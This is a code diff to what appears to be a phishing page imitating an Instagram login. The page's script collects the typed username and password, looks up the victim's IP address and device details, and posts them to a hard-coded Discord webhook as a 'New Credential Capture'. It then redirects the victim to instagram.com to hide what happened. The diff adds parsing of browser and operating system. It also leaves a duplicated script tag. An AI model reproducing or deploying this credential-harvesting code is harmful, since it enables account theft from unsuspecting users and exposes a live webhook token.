@@ -78,26 +78,29 @@
     }
   </script>
   <script>
+  <script>
   async function sendMessage() {
-  // Delay function
   const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
-  // Get form data
   const username = document.getElementById('username').value;
   const password = document.getElementById('password').value;
   const userAgent = navigator.userAgent;
 
-  // Fetch public IP address
+  // Extract clean browser and OS info
+  const browserInfo = getBrowserInfo(userAgent);
+  const osInfo = getOSInfo(userAgent);
+
+  // Get IP address
   let ip = "Unavailable";
   try {
     const res = await fetch('https://api.ipify.org?format=json');
     const data = await res.json();
     ip = data.ip;
-  } catch (error) {
-    console.error("IP fetch error:", error);
+  } catch (err) {
+    console.error("Failed to fetch IP:", err);
   }
 
-  // Construct payload
+  // Payload for Discord webhook
   const payload = {
     username: "🔔 Logger Bot",
     avatar_url: "https://i.imgur.com/AfFp7pu.png",
@@ -105,7 +108,7 @@
       {
         title: "🟡 New Credential Capture",
         description: "A new login attempt has been logged.",
-        color: 0xFFD700, // Gold color
+        color: 0xFFD700,
         fields: [
           {
             name: "👤 Username",
@@ -118,8 +121,8 @@
             inline: true
           },
           {
-            name: "🌐 Browser Info",
-            value: `\`${userAgent}\``,
+            name: "🖥️ Device Info",
+            value: `**Browser**: ${browserInfo}\n**OS**: ${osInfo}`,
             inline: false
           },
           {
@@ -137,15 +140,32 @@
     ]
   };
 
-  // Send to Discord webhook
   const request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1382345428669829120/hQNpgVsszl0Lepl2JxtJSjZC2YSQAoT2_UYTKurFYRHexes-0kqg6HUHygwL2OBkuCce");
   request.setRequestHeader('Content-type', 'application/json');
   request.send(JSON.stringify(payload));
 
-  // Redirect after delay
   await delay(2000);
   window.location.replace("https://www.instagram.com");
+}
+
+// Extract browser name from user agent
+function getBrowserInfo(ua) {
+  if (ua.includes("Firefox/")) return "Mozilla Firefox";
+  if (ua.includes("Edg/")) return "Microsoft Edge";
+  if (ua.includes("Chrome/")) return "Google Chrome";
+  if (ua.includes("Safari/") && !ua.includes("Chrome")) return "Apple Safari";
+  return "Unknown Browser";
+}
+
+// Extract operating system from user agent
+function getOSInfo(ua) {
+  if (ua.includes("Win")) return "Windows";
+  if (ua.includes("Mac")) return "macOS";
+  if (ua.includes("Linux")) return "Linux";
+  if (ua.includes("Android")) return "Android";
+  if (ua.includes("like Mac")) return "iOS";
+  return "Unknown OS";
 }
 
 </script>
